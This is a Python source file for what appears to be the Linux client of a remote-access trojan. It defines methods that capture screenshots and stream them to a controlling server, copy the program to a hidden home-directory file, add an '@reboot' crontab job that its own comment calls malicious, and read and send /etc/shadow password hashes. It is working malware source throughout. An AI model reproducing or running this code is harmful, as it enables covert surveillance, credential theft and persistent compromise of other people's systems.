import sys, os, subprocess
import secrets
import shutil, mss, mss.tools

from client import Client
from symbols import *

class LinuxClient(Client):
    def __init__(self, server_address, server_port):
        super().__init__(server_address, server_port)

    def screenshot(self, args):
        screen_path = f"/tmp/{secrets.token_hex(5)}.jpg"

        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)

        with open(screen_path, 'rb') as f:
            while (chunk := f.read(4096)):
                self.secure_sock.sendall(chunk)
        self.secure_sock.sendall(SIG_EOF)
        os.remove(screen_path)

    def persistence(self):

        self.agent_path = os.path.join(os.getenv('HOME'), f".{self.uid}")

        try:
            shutil.copy2(sys.argv[0], self.agent_path)

        except Exception as e:
            return 1

        # Read whole current crontab
        try:
            crontab = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
        except:
            return 0
        # Malicious cron for persistence
        job = f"@reboot bash -c {self.agent_path}\n"

        # Check if cron already exist
        if job not in crontab:
            crontab = crontab + job
            process = subprocess.run(['crontab', '-'], input=crontab, text=True)

        # TODO Self removing the executable

    def hashdump(self, args):
        if os.access('/etc/shadow', os.R_OK):
            try:
                with open('/etc/shadow', 'rb') as f:
                    while (chunk := f.read(4096)):
                        self.secure_sock.sendall(chunk)
                self.secure_sock.sendall(SIG_EOF)
            except Exception as e:
                self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
        else:
            # Sending error code if user doesnt have permissions to dump hashes
            self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)

    def ipconfig(self, args):
        try:
            output = subprocess.check_output("ip a", shell=True, text=True, encoding='utf-8', stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        finally:
            self.secure_sock.sendall(output.encode())